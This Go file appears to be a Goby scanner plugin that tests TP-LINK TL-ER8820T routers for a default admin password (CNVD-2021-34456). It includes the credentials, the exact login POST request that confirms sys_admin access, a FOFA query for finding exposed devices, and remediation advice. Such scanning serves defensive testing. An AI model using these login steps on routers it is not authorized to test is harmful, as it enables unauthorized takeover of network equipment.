package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TP-LINK TL-ER8820T Default Password Vulnerability",
    "Description": "<p>Tl-er8820t is a new generation of high-performance 10 Gigabit enterprise router launched by TP-LINK.</p><p>Username admin password 123456</p>",
    "Impact": "<p>TP-LINK TL-ER8820T Default password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "TL-ER8820T",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "TP-LINK TL-ER8820T 默认密码漏洞",
            "Product": "TL-ER8820T",
            "Description": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">TL-ER8820T是TP-LINK推出的新一代高性能万兆企业路由器。</span></p><p>用户名<span style=\"color: rgb(247, 49, 49); font-size: 13px;\">admin</span>密码<span style=\"color: rgb(247, 49, 49); font-size: 13px;\">123456</span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 14px;\">TL-ER8820T是TP-LINK推出的新一代高性能万兆企业路由器。</span></p><p>用户名<span style=\"color: rgb(247, 49, 49); font-size: 13px;\">admin</span>密码<span style=\"color: rgb(247, 49, 49); font-size: 13px;\">123456</span></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "TP-LINK TL-ER8820T Default Password Vulnerability",
            "Product": "TL-ER8820T",
            "Description": "<p>Tl-er8820t is a new generation of high-performance 10 Gigabit enterprise router launched by TP-LINK.</p><p>Username admin password 123456</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>TP-LINK TL-ER8820T Default password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"TL-ER8820T\"",
    "GobyQuery": "body=\"TL-ER8820T\"",
    "Author": "xiaodan",
    "Homepage": "https://www.tp-link.com.cn",
    "DisclosureDate": "2022-03-30",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-34456"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json; charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"method\":\"do\",\"login\":{\"username\":\"admin\",\"password\":\"0KcgeXhc9TefbwK\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "stok\":\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"role\":\"sys_admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json; charset=UTF-8"
                },
                "data_type": "text",
                "data": "{\"method\":\"do\",\"login\":{\"username\":\"admin\",\"password\":\"0KcgeXhc9TefbwK\"}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "stok\":\"",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"role\":\"sys_admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10369"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
